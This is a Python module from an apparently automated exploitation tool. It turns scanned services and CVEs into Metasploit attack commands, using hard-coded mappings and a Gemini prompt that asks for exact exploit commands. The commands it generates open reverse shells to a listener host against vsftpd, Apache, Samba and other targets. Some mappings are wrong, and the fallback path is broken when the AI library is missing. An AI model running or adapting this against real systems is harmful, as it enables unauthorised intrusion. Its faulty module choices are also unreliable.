import os
import json
import time
from datetime import datetime, timedelta

# Rate limiting variables
last_api_call = None
api_call_count = 0
minute_start = datetime.now()

def rate_limit_ai_calls():
    """Implement rate limiting for Gemini API (60 calls per minute)"""
    global last_api_call, api_call_count, minute_start
    
    current_time = datetime.now()
    
    # Reset counter if a new minute has started
    if current_time - minute_start > timedelta(minutes=1):
        api_call_count = 0
        minute_start = current_time
    
    # If we've made 50+ calls in this minute, wait
    if api_call_count >= 50:  # Stay under 60 limit
        wait_time = 60 - (current_time - minute_start).seconds
        if wait_time > 0:
            print(f"‚è≥ Rate limiting: waiting {wait_time}s...")
            time.sleep(wait_time)
            api_call_count = 0
            minute_start = datetime.now()
    
    # Small delay between calls to be respectful
    if last_api_call:
        time_since_last = (current_time - last_api_call).total_seconds()
        if time_since_last < 1:  # Minimum 1 second between calls
            time.sleep(1 - time_since_last)
    
    api_call_count += 1
    last_api_call = datetime.now()

# Try to get API key from environment variable
api_key = os.getenv('GOOGLE_API_KEY')

if not api_key:
    print("WARNING: GOOGLE_API_KEY environment variable not set. Using fallback data.")
    # Fallback without AI - just return basic exploit info
    def find_metasploit_exploit(exploit_data):
        """
        Generate basic Metasploit exploit info without AI
        """
        service = exploit_data.get('service', 'unknown')
        cve_id = exploit_data.get('cve_id', 'unknown')
        
        # Basic exploit mappings for common vulnerabilities
        exploit_mappings = {
            'vsftpd': {
                'exploit_module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 21)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/unix/ftp/vsftpd_234_backdoor',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 21)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            },
            'openssh': {
                'exploit_module': 'exploit/linux/ssh/openssh_enumusers',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 22)
                },
                'optional_options': {},
                'payload': 'payload/generic/shell_reverse_tcp',
                'commands': [
                    f'use exploit/linux/ssh/openssh_enumusers',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 22)}',
                    'set payload payload/generic/shell_reverse_tcp',
                    'exploit'
                ]
            },
            'apache': {
                'exploit_module': 'exploit/multi/http/apache_normalize_path_rce',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 80)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/multi/http/apache_normalize_path_rce',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 80)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            },
            'samba': {
                'exploit_module': 'exploit/linux/samba/is_known_pipename',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 445)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/linux/samba/is_known_pipename',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 445)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            }
        }
        
        # Return specific exploit if available, otherwise generic
        if service.lower() in exploit_mappings:
            return exploit_mappings[service.lower()]
        else:
            return {
                'exploit_module': 'exploit/multi/handler',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 80)
                },
                'optional_options': {},
                'payload': 'payload/generic/shell_reverse_tcp',
                'commands': [
                    f'use exploit/multi/handler',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 80)}',
                    'exploit'
                ]
            }
else:
    # Use Google Gemini API if key is available
    try:
        import google.generativeai as genai
        
        def find_metasploit_exploit(exploit_data):
            """
            Generate Metasploit exploit commands for a given exploit using AI
            """
            # Apply rate limiting
            rate_limit_ai_calls()
            
            genai.configure(api_key=api_key)
            model = genai.GenerativeModel('gemini-1.5-flash')
            
            prompt = f"""
            You are a cybersecurity expert specializing in Metasploit framework. 
            
            Given the following vulnerability data, provide ONLY a valid JSON response with the exact Metasploit commands to exploit it:
            
            Vulnerability Data: {json.dumps(exploit_data, indent=2)}
            
            Analyze the service, product, version, and any CVEs to suggest the most appropriate Metasploit exploit module.
            
            Return ONLY valid JSON in this exact format:
            {{
                "exploit_module": "exploit/path/to/module",
                "required_options": {{
                    "RHOSTS": "{exploit_data.get('host', '192.168.1.1')}",
                    "RPORT": {exploit_data.get('port', 80)},
                    "TARGET": 0
                }},
                "optional_options": {{
                    "LHOST": "192.168.1.50",
                    "LPORT": 4444
                }},
                "payload": "payload/generic/shell_reverse_tcp",
                "commands": [
                    "use exploit/path/to/module",
                    "set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                    "set RPORT {exploit_data.get('port', 80)}",
                    "set payload payload/generic/shell_reverse_tcp",
                    "set LHOST 192.168.1.50",
                    "set LPORT 4444",
                    "exploit"
                ]
            }}
            
            Do not include any explanations, just the JSON.
            """
            
            try:
                response = model.generate_content(prompt)
                
                # Try to parse the response as JSON
                try:
                    # Clean up the response text
                    response_text = response.text.strip()
                    if response_text.startswith('```json'):
                        response_text = response_text[7:]
                    if response_text.endswith('```'):
                        response_text = response_text[:-3]
                    response_text = response_text.strip()
                    
                    return json.loads(response_text)
                except json.JSONDecodeError as e:
                    print(f"JSON decode error: {e}")
                    print(f"Raw response: {response.text}")
                    # Fallback if JSON parsing fails
                    return {
                        "exploit_module": "exploit/multi/handler",
                        "required_options": {
                            "RHOSTS": exploit_data.get('host', '192.168.1.1'),
                            "RPORT": exploit_data.get('port', 80)
                        },
                        "optional_options": {
                            "LHOST": "192.168.1.50",
                            "LPORT": 4444
                        },
                        "payload": "payload/generic/shell_reverse_tcp",
                        "commands": [
                            "use exploit/multi/handler",
                            f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                            f"set RPORT {exploit_data.get('port', 80)}",
                            "set payload payload/generic/shell_reverse_tcp",
                            "set LHOST 192.168.1.50",
                            "set LPORT 4444",
                            "exploit"
                        ]
                    }
                    
            except Exception as e:
                print(f"AI generation error: {e}")
                return {
                    "error": f"Failed to generate exploit commands: {str(e)}",
                    "exploit_module": "exploit/multi/handler",
                    "required_options": {
                        "RHOSTS": exploit_data.get('host', '192.168.1.1'),
                        "RPORT": exploit_data.get('port', 80)
                    },
                    "optional_options": {
                        "LHOST": "192.168.1.50", 
                        "LPORT": 4444
                    },
                    "payload": "payload/generic/shell_reverse_tcp",
                    "commands": [
                        "use exploit/multi/handler",
                        f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                        f"set RPORT {exploit_data.get('port', 80)}",
                        "set payload payload/generic/shell_reverse_tcp",
                        "set LHOST 192.168.1.50",
                        "set LPORT 4444",
                        "exploit"
                    ]
                }
    except ImportError:
        print("WARNING: google-generativeai package not installed. Using fallback data.")
        # Use the fallback function defined above
        pass

def process_exploits_for_host(host_data):
    """
    Process all exploits found for a host and generate Metasploit commands
    """
    results = []
    
    print(f"Processing exploits for host: {host_data.get('host')}")
    print(f"Services: {host_data.get('services', [])}")
    
    for service in host_data.get('services', []):
        print(f"Processing service: {service}")
        if service.get('cves'):
            print(f"Found CVEs: {service['cves']}")
            for cve in service['cves']:
                exploit_info = {
                    'host': host_data['host'],
                    'port': service['port'],
                    'service': service['service'],
                    'product': service.get('product', 'Unknown'),
                    'version': service.get('version', 'Unknown'),
                    'cve_id': cve['id'],
                    'cve_severity': cve.get('severity', 'Unknown'),
                    'cve_score': cve.get('score', 'Unknown')
                }
                
                print(f"Generating Metasploit commands for: {exploit_info}")
                
                # Generate Metasploit commands
                metasploit_commands = find_metasploit_exploit(exploit_info)
                exploit_info['metasploit_commands'] = metasploit_commands
                
                print(f"Generated commands: {metasploit_commands}")
                results.append(exploit_info)
        else:
            print(f"No CVEs found for service: {service}")
    
    print(f"Total results: {len(results)}")
    return results